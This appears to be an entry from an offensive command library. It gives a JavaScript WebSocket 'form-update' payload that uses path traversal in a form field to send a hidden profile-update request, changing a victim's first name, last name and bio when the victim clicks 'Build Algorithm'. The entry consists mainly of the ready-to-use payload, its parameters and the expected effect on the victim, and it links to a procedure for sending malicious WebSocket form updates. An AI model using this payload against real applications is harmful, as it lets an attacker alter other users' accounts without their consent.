---
id: cmd-837328-form-update-profile
data: >-
  ws.send(JSON.stringify({type: 'form-update', element: '#algo-id', value:
  '/../../../../../users/update_profile?firstname=h1&lastname=test&bio=hi#',
  clientId: 'x', roomId: '5ce6e50b298f7c6e0acb68c6'}));
tags:
  - websocket
  - path-traversal
  - profile-modification
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:27.985Z'
verified: false
validated: true
submitted: true
---
# websocket-form-update-profile

## Command

```javascript
ws.send(JSON.stringify({
  type: 'form-update',
  element: '#algo-id',
  value: '/../../../../../users/update_profile?firstname=h1&lastname=test&bio=hi#',
  clientId: 'x',
  roomId: '5ce6e50b298f7c6e0acb68c6'
}));
```

## Description

Sets #algo-id to a traversal targeting profile update, allowing firstname, lastname, and bio changes when victim clicks 'Build Algorithm'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| type | Event type | Yes |
| element | Selector | Yes |
| value | Payload with profile params | Yes |
| clientId | ID | Yes |
| roomId | Room | Yes |

## Examples

### Basic Usage

```javascript
// As above
```

## Expected Output

Victim's profile updated to specified values upon trigger.

## Related

- [[commands/websocket-form-update-preferences]]
- [[procedures/Send-Malicious-WebSocket-Form-Update]]
